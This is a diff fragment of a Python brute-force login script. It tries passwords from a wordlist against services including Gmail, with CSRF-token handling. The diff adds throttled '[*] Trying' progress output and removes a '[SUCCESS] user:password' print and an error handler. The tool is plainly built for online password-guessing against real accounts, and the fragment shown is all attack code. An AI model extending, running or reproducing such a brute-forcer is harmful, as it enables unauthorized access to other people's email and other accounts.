@@ -70,6 +70,10 @@ def login(service_name, username, password_file_path):
         for password in passwords:
             payloads[service_name]["password"] = password
             
+            # Show progress without flooding terminal
+            if len(passwords) > 50 and passwords.index(password) % max(1, len(passwords)//30) == 0:
+                sys.stdout.write(f"\r[*] Trying {password} ({passwords.index(password)+1}/{len(passwords)})")
+            
             try:
                 # For Gmail, need to get initial CSRF token
                 if service_name == "gmail":
@@ -93,20 +97,11 @@ def login(service_name, username, password_file_path):
                 
                 elapsed = time.time() - start_time
                 
-                # Show progress in terminal without flooding it
-                if password == passwords[-1]:
-                    print(f"[SUCCESS] {username}:{password} (Time: {elapsed:.2f}s)")
-                    return True
-            
             except KeyboardInterrupt:
                 sys.exit(0)
     
     except FileNotFoundError:
         print(f"[!] Password file not found: {password_file_path}")
-    
-    except Exception as e:
-        if str(e) != "":
-            print(f"[ERROR] Service error: {str(e)}")
     
     return False
 
